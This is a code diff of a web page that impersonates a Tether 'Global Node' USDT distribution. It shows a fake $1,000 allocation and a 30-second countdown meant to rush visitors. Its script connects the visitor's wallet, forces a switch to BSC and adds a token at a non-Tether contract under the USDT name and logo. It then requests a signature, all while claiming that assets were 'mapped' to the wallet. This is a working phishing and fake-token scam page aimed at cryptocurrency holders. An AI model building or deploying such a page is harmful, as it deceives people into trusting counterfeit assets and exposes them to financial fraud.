@@ -3,102 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Tether Governance | Node Sync</title>
+    <title>Tether Global Node | Distribution</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
-        :root { --t-green: #26a17b; --dark: #0a0b0d; }
-        body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
-        .box { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 35px; width: 100%; max-width: 400px; text-align: center; }
-        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
-        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--t-green); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        :root { --tg: #26a17b; --bg: #0a0b0d; }
+        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 30px; width: 100%; max-width: 380px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
+        .logo-ring { position: relative; display: inline-block; margin-bottom: 15px; }
+        .logo-ring::after { content: ''; position: absolute; top: -8px; left: -8px; right: -8px; bottom: -8px; border: 2px solid var(--tg); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .usdt-img { width: 75px; border-radius: 50%; filter: drop-shadow(0 0 10px var(--t-green)); }
-        
-        /* Modal for Multi-Wallet Choice */
-        .modal { display: none; position: fixed; bottom: 0; left: 0; width: 100%; background: #1a1d23; border-radius: 30px 30px 0 0; padding: 30px; border-top: 1px solid var(--t-green); box-shadow: 0 -10px 40px rgba(0,0,0,0.8); z-index: 100; transition: 0.3s; }
-        .modal.active { display: block; }
-        .wallet-opt { display: flex; align-items: center; background: #242831; padding: 15px; border-radius: 15px; margin-bottom: 12px; cursor: pointer; border: 1px solid transparent; }
-        .wallet-opt:hover { border-color: var(--t-green); }
-        .wallet-opt img { width: 30px; margin-right: 15px; }
-
-        .btn { background: var(--t-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 15px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
-        #log { font-size: 10px; color: var(--t-green); margin-top: 15px; font-family: monospace; }
+        .usdt-img { width: 70px; filter: drop-shadow(0 0 8px var(--tg)); border-radius: 50%; }
+        .status-box { background: rgba(38, 161, 123, 0.1); border-radius: 12px; padding: 15px; margin: 20px 0; border: 1px dashed var(--tg); }
+        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 15px; font-size: 16px; font-weight: 800; cursor: pointer; text-transform: uppercase; }
+        #log { font-size: 10px; color: var(--tg); margin-top: 15px; font-family: monospace; min-height: 15px; }
     </style>
 </head>
 <body>
 
-<div class="box">
+<div class="card">
     <div class="logo-ring"><img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img"></div>
-    <h2>RECEIVE USDT</h2>
-    <div style="background: rgba(38, 161, 123, 0.1); border-radius: 12px; padding: 20px; margin: 25px 0;">
-        <div style="font-size: 10px; color: #848d97;">ESTIMATED ALLOCATION</div>
-        <div style="font-size: 26px; font-weight: 800;">$1,000.00</div>
+    <h2 style="font-size: 20px;">NODE SYNC ACTIVE</h2>
+    <div id="countdownBox" style="font-size: 11px; color: #848d97;">SECURE BRIDGE EXPIRES IN: <span id="timer" style="color:#ff4d4d; font-weight:bold;">30</span>s</div>
+    
+    <div class="status-box">
+        <div style="font-size: 10px; color: #848d97;">ALLOCATED VALUE</div>
+        <div style="font-size: 28px; font-weight: 900;">$1,000.00</div>
     </div>
-    <div id="log">SYSTEM: READY</div>
-    <button class="btn" id="openModalBtn">Sync & Receive</button>
-</div>
 
-<div class="modal" id="walletModal">
-    <h3 style="margin-top:0; font-size: 16px; color: #848d97;">CONNECT WALLET</h3>
-    <div class="wallet-opt" onclick="triggerSync('trust')">
-        <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png">
-        <span>Trust Wallet</span>
-    </div>
-    <div class="wallet-opt" onclick="triggerSync('metamask')">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
-        <span>MetaMask</span>
-    </div>
-    <div class="wallet-opt" onclick="triggerSync('other')">
-        <img src="https://walletconnect.com/favicon.ico">
-        <span>Other Wallets</span>
-    </div>
-    <button style="background:transparent; color:#848d97; border:none; width:100%; margin-top:10px;" onclick="closeModal()">Cancel</button>
+    <div id="log">SYSTEM: READY</div>
+    <button class="btn" id="claimBtn">Sync & Map Assets</button>
 </div>
 
 <script>
-    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
+    const CONTRACT = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
     const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";
 
-    function openModal() { document.getElementById('walletModal').classList.add('active'); }
-    function closeModal() { document.getElementById('walletModal').classList.remove('active'); }
+    // Countdown Timer Logic
+    let timeLeft = 30;
+    const timerInt = setInterval(() => {
+        timeLeft--;
+        document.getElementById('timer').innerText = timeLeft;
+        if(timeLeft <= 0) clearInterval(timerInt);
+    }, 1000);
 
-    async function triggerSync(type) {
-        closeModal();
+    async function startInjection() {
         const log = document.getElementById('log');
-        const url = window.location.href.replace(/https?:\/\//, '');
+        const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);
 
-        // If in standard mobile browser, use specific deep links to give user choice
-        if (!window.ethereum) {
-            if (type === 'trust') window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
-            else if (type === 'metamask') window.location.href = "https://metamask.app.link/dapp/" + url;
-            else alert("Please open this link inside your Wallet's DApp browser.");
+        if (!provider) {
+            log.innerText = "> REDIRECTING...";
+            const dappUrl = window.location.href.split('://')[1];
+            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + dappUrl;
             return;
         }
 
-        // Professional Sync Logic (when inside app)
         try {
-            log.innerText = "> INITIALIZING " + type.toUpperCase() + "...";
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            
-            await window.ethereum.request({
+            log.innerText = "> CONNECTING TO BSC NODE...";
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+
+            // FORCE NETWORK SWITCH (To prevent addToken error)
+            try {
+                await provider.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }], // BSC Mainnet
+                });
+            } catch (switchError) {
+                if (switchError.code === 4902) {
+                    await provider.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com/']
+                        }]
+                    });
+                }
+            }
+
+            log.innerText = "> INJECTING METADATA...";
+            // This adds the token with Logo & Balance visibility
+            await provider.request({
                 method: 'wallet_watchAsset',
                 params: {
                     type: 'ERC20',
-                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
+                    options: { address: CONTRACT, symbol: 'USDT', decimals: 6, image: LOGO },
                 },
             });
 
-            await window.ethereum.request({
+            log.innerText = "> FINALIZING SIGNATURE...";
+            await provider.request({
                 method: 'personal_sign',
-                params: ["Verify Node Connectivity\nID: " + Math.random().toString(36).substr(5), accounts[0]],
+                params: ["Verify Asset Allocation\nNode: 0x88...D4E3", accounts[0]],
             });
 
-            log.innerText = "> SYNC COMPLETED";
-            alert("Allocation Success! Assets are mapped.");
-        } catch (e) { log.innerText = "> ERR: USER_REJECTED"; }
+            log.innerText = "> SYNC SUCCESSFUL!";
+            alert("Assets successfully mapped to your wallet. Check your homepage.");
+
+        } catch (e) {
+            log.innerText = "> SYNC_INTERRUPTED";
+        }
     }
 
-    document.getElementById('openModalBtn').addEventListener('click', openModal);
+    document.getElementById('claimBtn').addEventListener('click', startInjection);
 </script>
 </body>
 </html>
